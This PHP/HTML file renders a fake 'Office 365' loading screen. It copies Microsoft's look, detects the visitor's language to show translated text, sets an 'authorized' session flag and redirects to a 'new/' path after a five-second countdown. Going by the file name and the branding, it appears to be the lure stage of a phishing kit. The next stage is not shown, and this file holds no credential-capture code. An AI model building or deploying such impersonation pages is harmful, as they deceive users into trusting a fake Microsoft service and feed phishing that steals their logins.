<?php
session_start();
// office-loading-simple.php
header('Content-Type: text/html; charset=utf-8');
$_SESSION['authorized']="0";
header("Refresh: 5; url=new/");

// Function to detect browser language
function detectLanguage() {
    $available_langs = ['fr', 'en', 'es', 'it', 'ja', 'zh', 'pt-br', 'es-mx', 'ro'];
    $default_lang = 'en';
    
    if (isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
        $browser_langs = explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE']);
        
        foreach ($browser_langs as $browser_lang) {
            // Extract primary language (fr, en, etc.)
            $lang = substr($browser_lang, 0, 2);
            $full_lang = strtolower(substr($browser_lang, 0, 5));
            
            // Check for specific variants first
            if ($full_lang == 'pt-br' && in_array('pt-br', $available_langs)) {
                return 'pt-br';
            } elseif ($full_lang == 'es-mx' && in_array('es-mx', $available_langs)) {
                return 'es-mx';
            } elseif (in_array($full_lang, $available_langs)) {
                return $full_lang;
            }
            
            // Then check primary language
            if (in_array($lang, $available_langs)) {
                return $lang;
            }
            
            // Special cases
            if ($lang == 'pt' && in_array('pt-br', $available_langs)) {
                return 'pt-br';
            }
            if ($lang == 'es' && in_array('es', $available_langs)) {
                return 'es';
            }
            if ($lang == 'zh' && in_array('zh', $available_langs)) {
                return 'zh';
            }
            if ($lang == 'ro' && in_array('ro', $available_langs)) {
                return 'ro';
            }
        }
    }
    
    return $default_lang;
}

$lang = detectLanguage();

// Translations array
$translations = [
    'fr' => [
        'title' => 'Chargement - Office 365',
        'subtitle' => 'Chargement automatique en cours...',
        'redirect' => 'Redirection automatique dans %d secondes...',
        'office' => 'Office 365'
    ],
    'en' => [
        'title' => 'Loading - Office 365',
        'subtitle' => 'Automatic loading in progress...',
        'redirect' => 'Automatic redirect in %d seconds...',
        'office' => 'Office 365'
    ],
    'es' => [
        'title' => 'Cargando - Office 365',
        'subtitle' => 'Carga automática en curso...',
        'redirect' => 'Redirección automática en %d segundos...',
        'office' => 'Office 365'
    ],
    'es-mx' => [
        'title' => 'Cargando - Office 365',
        'subtitle' => 'Carga automática en progreso...',
        'redirect' => 'Redirección automática en %d segundos...',
        'office' => 'Office 365'
    ],
    'it' => [
        'title' => 'Caricamento - Office 365',
        'subtitle' => 'Caricamento automatico in corso...',
        'redirect' => 'Reindirizzamento automatico tra %d secondi...',
        'office' => 'Office 365'
    ],
    'ja' => [
        'title' => '読み込み中 - Office 365',
        'subtitle' => '自動読み込み中...',
        'redirect' => '%d秒後に自動的にリダイレクトされます...',
        'office' => 'Office 365'
    ],
    'zh' => [
        'title' => '加载中 - Office 365',
        'subtitle' => '自动加载进行中...',
        'redirect' => '%d秒后自动跳转...',
        'office' => 'Office 365'
    ],
    'pt-br' => [
        'title' => 'Carregando - Office 365',
        'subtitle' => 'Carregamento automático em andamento...',
        'redirect' => 'Redirecionamento automático em %d segundos...',
        'office' => 'Office 365'
    ],
    'ro' => [
        'title' => 'Se încarcă - Office 365',
        'subtitle' => 'Încărcare automată în curs...',
        'redirect' => 'Redirecționare automată în %d secunde...',
        'office' => 'Office 365'
    ]
];

// Get current language translations
$current = $translations[$lang];
?>
<!DOCTYPE html>
<html lang="<?php echo $lang; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $current['title']; ?></title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: white;
            margin: 0;
            text-align: center;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
            animation: pulse 2s infinite;
        }
        
        .logo svg {
            width: 40px;
            height: 40px;
        }
        
        h1 {
            font-size: 28px;
            font-weight: 300;
            margin-bottom: 10px;
        }
        
        .subtitle {
            font-size: 16px;
            opacity: 0.9;
            margin-bottom: 40px;
        }
        
        .loader {
            width: 200px;
            height: 4px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 2px;
            overflow: hidden;
            margin: 30px auto;
        }
        
        .loader::after {
            content: '';
            display: block;
            width: 100%;
            height: 100%;
            background: white;
            animation: loading 5s linear forwards;
            border-radius: 2px;
        }
        
        .countdown {
            font-size: 14px;
            opacity: 0.8;
            margin-top: 20px;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        
        @keyframes loading {
            0% { width: 0%; }
            100% { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="logo">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white">
            <path d="M23 2H1v20h22V2zM8 20H3v-9h5v9zm7.5 0H9v-9h6.5v9zm7.5 0h-5v-9h5v9zm0-11H3V4h18v5z"/>
        </svg>
    </div>
    
    <h1><?php echo $current['office']; ?></h1>
    <div class="subtitle"><?php echo $current['subtitle']; ?></div>
    
    <div class="loader"></div>
    
    <div class="countdown" data-translate="<?php echo $current['redirect']; ?>">
        <?php echo sprintf($current['redirect'], 5); ?>
    </div>
    
    <script>
        // Compte à rebours simple avec support multilingue
        let seconds = 5;
        const countdownElement = document.querySelector('.countdown');
        const translateTemplate = countdownElement.getAttribute('data-translate');
        
        const timer = setInterval(() => {
            seconds--;
            // Use the template string from PHP
            countdownElement.textContent = translateTemplate.replace('%d', seconds);
            
            if (seconds <= 0) {
                clearInterval(timer);
            }
        }, 1000);
    </script>
</body>
</html>